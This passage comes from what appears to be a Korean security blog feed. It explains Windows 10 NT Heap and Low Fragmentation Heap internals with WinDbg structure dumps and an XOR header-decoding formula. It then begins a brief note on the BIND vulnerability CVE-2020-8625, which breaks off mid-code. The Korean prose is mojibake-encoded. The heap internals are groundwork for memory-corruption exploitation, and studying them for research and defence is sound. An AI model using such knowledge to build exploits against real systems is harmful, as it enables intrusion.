+0x140 UCRIndex         : (null)    +0x148 PseudoTagEntries : (null)    +0x150 FreeLists        : _LIST_ENTRY [ 0x000001cd`c8f95e10 - 0x000001cd`c8fab880 ]...   +0x198 FrontEndHeap     : 0x000001cd`c8f20000 Void   +0x1a0 FrontHeapLockCount : 0   +0x1a2 FrontEndHeapType : 0x2 &#x27;&#x27;   +0x1a3 RequestedFrontEndHeapType : 0x2 &#x27;&#x27;   +0x1a8 FrontEndHeapUsageData : 0x000001cd`c8f98210  &quot;&quot;   +0x1b0 FrontEndHeapMaximumIndex : 0x402   +0x1b2 FrontEndHeapStatusBitmap : [129]  &quot;x&quot;   +0x238 Counters         : _HEAP_COUNTERS   +0x2b0 TuningParameters : _HEAP_TUNING_PARAMETERS</code></pre><ul><li>0x7c EncodeFlagMask : Heap chunk headerê°€ ì¸ì½”ë”© ë˜ì—ˆëŠ”ì§€ë¥¼ ë‚˜íƒ€ë‚´ëŠ” í•„ë“œ. ì²˜ìŒ Heapì„ ì´ˆê¸°í™”í•  ë•Œ <code>0x100000</code>ìœ¼ë¡œ ì„¤ì •ë¨</li><li>0x080 Encoding : Heap headerì˜ ë³€ì¡°ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ XOR ì¸ì½”ë”©ì„ í•  ë•Œ ì‚¬ìš©ë¨</li><li>0x138 BlocksIndex : <code>_HEAP_LIST_LOOKUP</code> êµ¬ì¡°ì²´ë¥¼ ê°€ë¦¬í‚´  <code>_HEAP_LIST_LOOKUP</code> êµ¬ì¡°ì²´ëŠ” Back-Endì—ì„œ Heap chunkë“¤ì„ ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë¨</li><li>0x150 FreeLists : í• ë‹¹ í•´ì œëœ Heap Chunkë“¤ì˜ <code>_HEAP_ENTRY</code> êµ¬ì¡°ì²´ë¥¼ ê°€ë¦¬í‚´</li><li>0x198 FrontEndHeap : LFHê°€ í™œì„±í™”ëœ ê²½ìš° í• ë‹¹ëœ <code>_LFH_HEAP</code> êµ¬ì¡°ì²´ë¥¼ ê°€ë¦¬í‚´</li><li>0x1a2 FrontEndHeapType : LFH í™œì„±í™” ì—¬ë¶€ë¥¼ ë‚˜íƒ€ë‚´ë©° <code>0x0</code> ì´ë©´ ë¹„í™œì„±í™”, <code>0x2</code>ë©´ í™œì„±í™”ëœ ìƒíƒœ. <code>HeapQueryInformaton()</code> í•¨ìˆ˜ë¥¼ í†µí•´ LFH í™œì„±í™” ì—¬ë¶€ë¥¼ êµ¬ë³„í•  ë•Œ ì‚¬ìš©ë¨</li><li>0x1a8 FrontEndHeapUsageData : í• ë‹¹ë˜ëŠ” Chunkì˜ ìˆ˜ë¥¼ ê¸°ë¡í•˜ë©° ì¼ì • ìˆ˜ì¤€ì— ë„ë‹¬í•˜ë©´ Front-End(LFH)ë¥¼ í™œì„±í™”</li></ul><p><code>FrontEndHeap</code>ì— ìœ íš¨í•œ ì£¼ì†Œ ê°’ì´ ìˆê³  <code>FrontEndHeapType</code> ê°’ì´ <code>0x2</code>ì¸ê±¸ë¡œ LFHê°€ í™œì„±í™”ë˜ì–´ Heap ë©”ëª¨ë¦¬ë“¤ì„ ê´€ë¦¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Back-End-Structure"><a href="#Back-End-Structure" class="headerlink" title="Back-End Structure"></a>Back-End Structure</h2><p>ì‹¤ì§ˆì ì¸ Heapì˜ í• ë‹¹ ë° í•´ì œë¥¼ ê´€ë¦¬í•˜ëŠ” NT Heapì˜ Back-End êµ¬ì¡°ì²´ì…ë‹ˆë‹¤.</p><h3 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h3><p>í• ë‹¹ëœ HEAP Chunkì˜ header êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. ì•ì„œ <code>_HEAP</code>ì˜ <code>Encoding</code> í•„ë“œ ì„¤ëª…ëŒ€ë¡œ headerì˜ ë³€ì¡°ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ XOR ì¸ì½”ë”©ì„ í•˜ê¸° ë•Œë¬¸ì— ë””ì½”ë”© ê³¼ì •ì„ ê±°ì³ì•¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>LFHë¡œ ê´€ë¦¬ë˜ëŠ”ì§€ ì•„ë‹Œì§€ì— ë”°ë¼ XOR ì¸ì½”ë”© ë°©ì‹ì´ ë‹¤ë¥´ë©° ì§ì ‘ ë””ì½”ë”©í•´ë³´ë©´ì„œ <code>_HEAP_ENTRY</code> ê°’ì„ í™•ì¸í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2010.png"></p><p>LFHê°€ í™œì„±í™”ë˜ì§€ ì•Šì€ ì¸ë±ìŠ¤ 0ì˜ Chunk headerëŠ” <code>_Heap</code>ì˜ Encode í•„ë“œì™€ XOR ì—°ì‚°ìœ¼ë¡œ ì¸ì½”ë”© ë©ë‹ˆë‹¤. ì´ ë‘ ê°’ì„ XOR í•œ ê²°ê³¼ë¡œ <code>chunk+0x10</code>(16 bytes ë‹¨ìœ„ì´ë¯€ë¡œ 0x18ì„ ìˆ˜ì •)ì„ ìˆ˜ì •í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ë””ì½”ë”©ëœ <code>_HEAP_ENTRY</code>ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2011.png"></p><h3 id="FreeLists-HEAP-ENTRY"><a href="#FreeLists-HEAP-ENTRY" class="headerlink" title="FreeLists(_HEAP_ENTRY)"></a>FreeLists(_HEAP_ENTRY)</h3><p>chunkê°€ í•´ì œë˜ë©´ sizeì— ë”°ë¼ FreeListì— ë°°ì¹˜ë©ë‹ˆë‹¤. </p><p>FreeListsì˜ êµ¬ì¡°ëŠ” glibcì˜ unstored binê³¼ ìœ ì‚¬í•˜ë©° í•´ì œëœ chunkì˜ <code>_HEAP_ENTRY</code> ë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤. </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2012.png"></p><pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)0x1cdc8f90150))(*((ntdll!_LIST_ENTRY *)0x1cdc8f90150))                 [Type: _LIST_ENTRY]    [+0x000] Flink            : 0x1cdc8f95e10 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8fab880 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8fab880)((ntdll!_LIST_ENTRY *)0x1cdc8fab880)                 : 0x1cdc8fab880 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f90150 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f94cd0)((ntdll!_LIST_ENTRY *)0x1cdc8f94cd0)                 : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8fab880 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f95f40)((ntdll!_LIST_ENTRY *)0x1cdc8f95f40)                 : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f94cd0 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8f951d0)((ntdll!_LIST_ENTRY *)0x1cdc8f951d0)                 : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f95f40 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8fa7b30 [Type: _LIST_ENTRY *]0:001&gt; dx -r1 ((ntdll!_LIST_ENTRY *)0x1cdc8fa7b30)((ntdll!_LIST_ENTRY *)0x1cdc8fa7b30)                 : 0x1cdc8fa7b30 [Type: _LIST_ENTRY *]    [+0x000] Flink            : 0x1cdc8f951d0 [Type: _LIST_ENTRY *]    [+0x008] Blink            : 0x1cdc8f93100 [Type: _LIST_ENTRY *]</code></pre><h3 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h3><p><code>_HEAP</code>ì˜ <code>BlocksIndex</code>í•„ë“œì—ì„œ ì°¸ì¡°í•˜ëŠ” êµ¬ì¡°ì²´ë¡œ ë‹¤ì–‘í•œ í¬ê¸°ì˜ í•´ì œëœ chunkë¥¼ ê´€ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ì–´ Best Fit ì •ì±…ì„ ì‚¬ìš©í•˜ëŠ” NT Heapì—ì„œ ì ì ˆí•œ chunkë¥¼ ë¹ ë¥´ê²Œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dt _HEAP_LIST_LOOKUP 0x000001cd`c8f902e8ntdll!_HEAP_LIST_LOOKUP   +0x000 ExtendedLookup   : 0x000001cd`c8f9ab70 _HEAP_LIST_LOOKUP   +0x008 ArraySize        : 0x80   +0x00c ExtraItem        : 0   +0x010 ItemCount        : 9   +0x014 OutOfRangeItems  : 0   +0x018 BaseIndex        : 0   +0x020 ListHead         : 0x000001cd`c8f90150 _LIST_ENTRY [ 0x000001cd`c8f95e10 - 0x000001cd`c8fab880 ]   +0x028 ListsInUseUlong  : 0x000001cd`c8f90320  -&gt; 0x18850   +0x030 ListHints        : 0x000001cd`c8f90330  -&gt; (null)</code></pre><ul><li>0x000 ExtendedLookup : ë‹¤ìŒ <code>_HEAP_LIST_LOOKUP</code> êµ¬ì¡°ì²´ë¥¼ ê°€ë¦¬í‚´</li><li>0x008 ArrySize : chunkì˜ ìµœëŒ€ ì‚¬ì´ì¦ˆ &gt;&gt; 4 ë¡œ, ì„¤ì •ëœ ì‹¤ì œ ìµœëŒ€ ì‚¬ì´ì¦ˆëŠ” 0x800</li><li>0x010 ItemCount : ê´€ë¦¬ ì¤‘ì¸ chunkì˜ ìˆ˜</li><li>0x014 OutOfRangeItems : ìµœëŒ€ ê´€ë¦¬ ê°€ëŠ¥í•œ ì‚¬ì´ì¦ˆë¥¼ ë„˜ì€ chunkì˜ ìˆ˜</li><li>0x018 BaseIndex : <code>_HEAP_LIST_LOOKUP</code> ì—ì„œ ê´€ë¦¬ë˜ëŠ” chunkì˜ ì‹œì‘ index, ListHintì—ì„œ ì ì ˆí•œ í¬ê¸°ì˜ í•´ì œëœ chunkë¥¼ ì°¾ì„ ë•Œë„ ì‚¬ìš©ë¨. í˜„ì¬ BaseIndexì˜ ìµœëŒ“ê°’ì€ ë‹¤ìŒ BlocksIndexì˜ BaseIndex</li><li>0x020 ListHead : í•´ì œëœ chunk listì˜ Head</li><li>0x028 ListsInUseUlong : ListHintê°€ ê°€ë¦¬í‚¤ëŠ” chunkë“¤ ì¤‘ ì‚¬ìš© ê°€ëŠ¥í•œ chunkë¥¼ ê°€ë¦¬í‚´</li><li>0x030 ListHints : ì ì ˆí•œ í¬ê¸°ì˜ chunkë¥¼ ë¹ ë¥´ê²Œ ì°¾ê¸° ìœ„í•œ Back-End í• ë‹¹ìì˜ í•µì‹¬ìœ¼ë¡œ ê°™ì€ í¬ê¸°ì˜ í•´ì œëœ chunk listë¥¼ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œ ë°°ì—´(ê° ìš”ì†ŒëŠ” 0x10 size)</li></ul><h2 id="Front-End-Structure"><a href="#Front-End-Structure" class="headerlink" title="Front-End Structure"></a>Front-End Structure</h2><p>Front-EndëŠ” Low Fragmentation Heap ê³¼ì •ì´ë©° ë©”ëª¨ë¦¬ í• ë‹¹ ë° í•´ì œì— ì§ì ‘ì ìœ¼ë¡œ ê´€ì—¬í•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤.</p><h3 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h3><p>UserBlockì˜ header ì—­í• ì„ í•˜ëŠ” êµ¬ì¡°ì²´ì´ë©° XOR ì—°ì‚°ìœ¼ë¡œ ì¸ì½”ë”© ë˜ì–´ ìˆìŠµë‹ˆë‹¤. LFH chunkëŠ”  <code>_HEAP_ENTRY</code> ì˜ <code>SubSegmentCode</code> í•„ë“œì— ì¸ì½”ë”© ê²°ê´ê°’ì„ ì €ì¥í•©ë‹ˆë‹¤. </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2013.png"></p><pre><code class="hljs c">(SubSegmentCode ^ pLFHKey ^ &amp;_HEAP ^ (&amp;_HEAP_ENTRY &gt;&gt; <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">0xc</span></code></pre><p>ì˜ ê²°ê´ê°’ì´ chunk ì£¼ì†Œë¡œë¶€í„°ì˜ <code>_HEAP_USERDATA_HEADER</code> ì˜¤í”„ì…‹ìœ¼ë¡œ, ì•„ë˜ì™€ ê°™ì´ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2014.png"></p><ul><li>0x000 SubSegment : UserBlockì˜ SubSegment ì£¼ì†Œë¥¼ ê°€ë¦¬í‚´</li><li>0x018 EncodedOffsets : chunk headerì˜ ë¬´ê²°ì„± ê²€ì¦ì— ì‚¬ìš©ë¨</li><li>0x020 BusyBitmap : chunkê°€ ì‚¬ìš© ì¤‘ì¸ì§€ë¥¼ ë‚˜íƒ€ëƒ„</li></ul><h3 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h3><p>LFH chunkë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” êµ¬ì¡°ì²´ì´ë©° <code>_HEAP</code> ì˜ <code>FrontEndHeap</code> í•„ë“œì—ì„œ ì°¸ì¡°í•©ë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dt _LFH_HEAP 0x000001cd`c8f20000ntdll!_LFH_HEAP   +0x000 Lock             : _RTL_SRWLOCK   +0x008 SubSegmentZones  : _LIST_ENTRY [ 0x000001cd`c8fa30d0 - 0x000001cd`c8fa30d0 ]   +0x018 Heap             : 0x000001cd`c8f90000 Void   +0x020 NextSegmentInfoArrayAddress : 0x000001cd`c8f21140 Void   +0x028 FirstUncommittedAddress : 0x000001cd`c8f22000 Void   +0x030 ReservedAddressLimit : 0x000001cd`c8f3a000 Void   +0x038 SegmentCreate    : 7   +0x03c SegmentDelete    : 0   +0x040 MinimumCacheDepth : 0   +0x044 CacheShiftThreshold : 0   +0x048 SizeInCache      : 0   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES   +0x2a4 Buckets          : [129] _HEAP_BUCKET   +0x4a8 SegmentInfoArrays : [129] (null)    +0x8b0 AffinitizedInfoArrays : [129] (null)    +0xcb8 SegmentAllocator : (null)    +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</code></pre><ul><li><p>0x018 Heap : í˜„ì¬ _LFH_HEAP ì°¸ì¡°í•˜ëŠ” _HEAP êµ¬ì¡°ì²´ì˜ ì‹œì‘ì„ ê°€ë¦¬í‚´</p></li><li><p>0x2a4 Buckets : í• ë‹¹ ìš”ì²­ëœ chunk í¬ê¸°ì™€ ì¼ì¹˜í•˜ëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ ë°°ì—´</p></li><li><p>0x4a8 SegmentInfoArrays : <code>_HEAP_LOCAL_SEGMENT_INFO</code> êµ¬ì¡°ì²´ ë°°ì—´ì„ ê°€ë¦¬í‚¤ë©° chunkë¥¼ í¬ê¸°ë³„ë¡œ ê°ê°ì˜ SubSegmentë¡œ ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë¨</p>  <pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x1cdc8f204a8))(*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x1cdc8f204a8))                 [Type: _HEAP_LOCAL_SEGMENT_INFO * [129]]    [0]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [1]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [2]              : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [3]              : 0x1cdc8f20f00 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [4]              : 0x1cdc8f20fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [5]              : 0x1cdc8f21080 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [6]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]...</code></pre></li><li><p>0xcc0 LocalData : _HEAP_LOCAL_DATAë¥¼ ê°€ë¦¬í‚¤ë©° LFHì˜ ì£¼ì†Œë¥¼ ê²€ìƒ‰í•˜ëŠ” ë° ì‚¬ìš©ë¨</p></li></ul><h3 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h3><p>LFHê°€ chunkë¥¼ í• ë‹¹í•  ë•Œ ì°¸ì¡°í•˜ë©° Bucketì„ ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. <code>_LFH_HEAP</code>ì˜ Buckets í•„ë“œì—ì„œ ì°¸ì¡°í•©ë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dt _HEAP_BUCKET 0x1cdc8f202a4ntdll!_HEAP_BUCKET   +0x000 BlockUnits       : 1   +0x002 SizeIndex        : 0 &#x27;&#x27;   +0x003 UseAffinity      : 0y0   +0x003 DebugFlags       : 0y00   +0x003 Flags            : 0 &#x27;&#x27;</code></pre><ul><li>0x000 BlockUnits : Bucketì´ ê°€ë¦¬í‚¤ëŠ” chunkì˜ í¬ê¸° &gt;&gt; 4</li><li>0x002 SizeIndex : í•´ë‹¹ Bucketì˜ indexê°’. <code>_LFH_HEAP</code>ì˜ <code>SegmentInfoArrays</code> ë°°ì—´ì˜ index ê°’ìœ¼ë¡œë„ ì‚¬ìš©ë¨</li></ul><h3 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h3><p>SubSegmentë¥¼ ê´€ë¦¬í•˜ëŠ” êµ¬ì¡°ì²´ì´ë©° <code>_LFH_HEAP</code> ì˜ <code>SegmentInfoArrays</code> í•„ë“œì—ì„œ ì°¸ì¡°í•©ë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dx -r1 ((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x1cdc8f20e40)((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x1cdc8f20e40)                 : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [+0x000] LocalData        : 0x1cdc8f20cc0 [Type: _HEAP_LOCAL_DATA *]    [+0x008] ActiveSubsegment : 0x1cdc8fa3170 [Type: _HEAP_SUBSEGMENT *]    [+0x010] CachedItems      [Type: _HEAP_SUBSEGMENT * [16]]    [+0x090] SListHeader      [Type: _SLIST_HEADER]    [+0x0a0] Counters         [Type: _HEAP_BUCKET_COUNTERS]    [+0x0a8] LastOpSequence   : 0x3 [Type: unsigned long]    [+0x0ac] BucketIndex      : 0x2 [Type: unsigned short]    [+0x0ae] LastUsed         : 0x0 [Type: unsigned short]    [+0x0b0] NoThrashCount    : 0x0 [Type: unsigned short]</code></pre><h3 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h3><p>LFHë¡œ í• ë‹¹í•œ chunkë“¤ì„ í¬ê¸°ë³„ë¡œ ê´€ë¦¬í•  ë•Œ ì‚¬ìš©í•˜ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. <code>_HEAP_LOCAL_SEGMENT_INFO</code>ì˜ <code>ActiveSubsegment</code> í•„ë“œì™€ <code>Cacheditems</code> í•„ë“œì—ì„œ ì°¸ì¡°í•©ë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dx -r1 ((ntdll!_HEAP_SUBSEGMENT *)0x1cdc8fa3170)((ntdll!_HEAP_SUBSEGMENT *)0x1cdc8fa3170)                 : 0x1cdc8fa3170 [Type: _HEAP_SUBSEGMENT *]    [+0x000] LocalInfo        : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [+0x008] UserBlocks       : 0x1cdc8fa74e0 [Type: _HEAP_USERDATA_HEADER *]    [+0x010] DelayFreeList    [Type: _SLIST_HEADER]    [+0x020] AggregateExchg   [Type: _INTERLOCK_SEQ]    [+0x024] BlockSize        : 0x3 [Type: unsigned short]    [+0x026] Flags            : 0x0 [Type: unsigned short]    [+0x028] BlockCount       : 0x13 [Type: unsigned short]    [+0x02a] SizeIndex        : 0x2 [Type: unsigned char]    [+0x02b] AffinityIndex    : 0x0 [Type: unsigned char]    [+0x024] Alignment        [Type: unsigned long [2]]    [+0x02c] Lock             : 0x7 [Type: unsigned long]    [+0x030] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]0:001&gt; dx -r1 (*((ntdll!_HEAP_SUBSEGMENT * (*)[16])0x1cdc8f20e50))(*((ntdll!_HEAP_SUBSEGMENT * (*)[16])0x1cdc8f20e50))                 [Type: _HEAP_SUBSEGMENT * [16]]    [0]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [1]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [2]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [3]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [4]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [5]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [6]              : 0x0 [Type: _HEAP_SUBSEGMENT *]...</code></pre><ul><li>0x000 LocalInfo : í˜„ì¬ SubSegmentì˜ <code>_HEAP_LOCAL_SEGMENT_INFO</code> ë¥¼ ê°€ë¦¬í‚´</li><li>0x008 UserBlock : í˜„ì¬ SubSegmentì˜ UserBlock(<code>_HEAP_USERDATA_HEADER</code>)ë¥¼ ê°€ë¦¬í‚´</li><li>0x020 AggregateExchg : <code>_INTERLOCK_SEQ</code> êµ¬ì¡°ì²´ë¥¼ ì°¸ì¡°í•˜ë©° UserBlockì˜ í•´ì œëœ chunk ê°œìˆ˜ë¥¼ ë‚˜íƒ€ëƒ„. LFHëŠ” ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ Userblockì—ì„œ í• ë‹¹í•´ì•¼ í•˜ëŠ”ì§€ ê²°ì •í•¨</li><li>0x024 BlockSize : UserBlockì˜ ê° chunk í¬ê¸° &gt;&gt; 4</li><li>0x028 BlockCount : UserBlockì— í• ë‹¹ëœ chunkì˜ ê°œìˆ˜</li><li>0x02a SizeIndex : UserBlockì— í•´ë‹¹í•˜ëŠ” SizeIndex(<code>_HEAP_LOCAL_SEGMENT_INFO</code>ì˜ <code>BucketIndex</code>ì™€ ê°™ì€ ê°’)</li></ul><h3 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h3><p>í• ë‹¹, í•´ì œëœ chunkì˜ ê°œìˆ˜ë¥¼ êµ¬í•  ë•Œ ì°¸ì¡°í•˜ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. <code>_HEAP_SUBSEGMENT</code>ì˜ <code>AggregateExchg</code> í•„ë“œì—ì„œ  ì°¸ì¡°í•©ë‹ˆë‹¤.</p><pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_INTERLOCK_SEQ *)0x1cdc8fa3190))(*((ntdll!_INTERLOCK_SEQ *)0x1cdc8fa3190))                 [Type: _INTERLOCK_SEQ]    [+0x000] Depth            : 0x7 [Type: unsigned short]    [+0x002 (14: 0)] Hint     : 0x2 [Type: unsigned short]    [+0x002 (15:15)] Lock     : 0x0 [Type: unsigned short]    [+0x002] Hint16           : 0x2 [Type: unsigned short]    [+0x000] Exchg            : 131079 [Type: long]</code></pre><ul><li>0x000 Depth : UserBlockì— ë‚¨ì•„ìˆëŠ” í•´ì œ ëœ ì²­í¬ ê°œìˆ˜</li></ul><p>ë„¤ ì´ë²ˆ ê¸€ì€ ì—¬ê¸°ì„œ ëì…ë‹ˆë‹¤. ë­”ê°€ ë§ˆë¬´ë¦¬ê°€ ì°ì°í•œ ê²ƒ ê°™ì£ ..? ìƒê°ë„ ëª»í•œ êµ¬ì¡°ì²´ ê°œìˆ˜ë¡œ ì´ë²ˆì—ë„ ì—­ì‹œë‚˜ ë¶„ëŸ‰ì¡°ì ˆì— ì‹¤íŒ¨í•´ë²„ë ¸.. ã…ã…;  </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2015.jpg"></p><p>NT Heapì˜ ìì„¸í•œ memory allocate processëŠ” ë‹¤ìŒ ê¸€ì—ì„œ ì†Œê°œí•  ì˜ˆì •ì´ë©° í°ì¿¨ì„¹ì‹œ ì‹œë¦¬ì¦ˆëŠ” ë‹¤ìŒ ê¸€ë¡œ ëŒì•„ì˜¤ê² ìŠµë‹ˆë‹¤!</p><blockquote><p>P.S : ì•„ ê·¸ë¦¬ê³  ì´ê±´ ëª°ë˜ ë§ì”€ë“œë¦¬ëŠ” ê±´ë°(ì†ë‹¥) ê³§ íŠ¹ë³„í•œ ê²Œì‹œê¸€ì´ ì˜¬ë¼ì˜¬ ì˜ˆì •ì´ë‹ˆ(ì†ë‹¥) ê¸°ëŒ€í•´ì£¼ì„¸ìš”!</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p><p><a href="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html">https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html</a></p><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8625: Fifteen-year-old RCE bug</title>
    <link href="/2021/02/27/fabu1ous/2021-02-27/"/>
    <url>/2021/02/27/fabu1ous/2021-02-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.thezdi.com/blog/2021/2/24/cve-2020-8625-a-fifteen-year-old-rce-bug-returns-in-isc-bind-server">CVE-2020-8625: A FIFTEEN-YEAR-OLD RCE BUG RETURNS IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>BIND version 9.11 ~ 9.16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>15ë…„ ì „ ISC BIND ì„œë²„ì—ì„œ 4-byte í™ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì•…ìš©í•œ RCE ì·¨ì•½ì (CVE-2006-5989)ì´ ë°œê²¬ëìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ê°€ merge ë˜ì§€ ì•Šì•„ ë°©ì¹˜ëê³ , ì‘ë…„(2020ë…„)ì— CVE-2020-8625ë¼ëŠ” ë²ˆí˜¸ë¡œ íŒ¨ì¹˜ëìŠµë‹ˆë‹¤. </p><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> der_get_oid(<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">size_t</span> len, oid *data, <span class="hljs-keyword">size_t</span> *size) &#123; <span class="hljs-comment">// ... </span>data-&gt;components = <span class="hljs-built_in">malloc</span>(len * <span 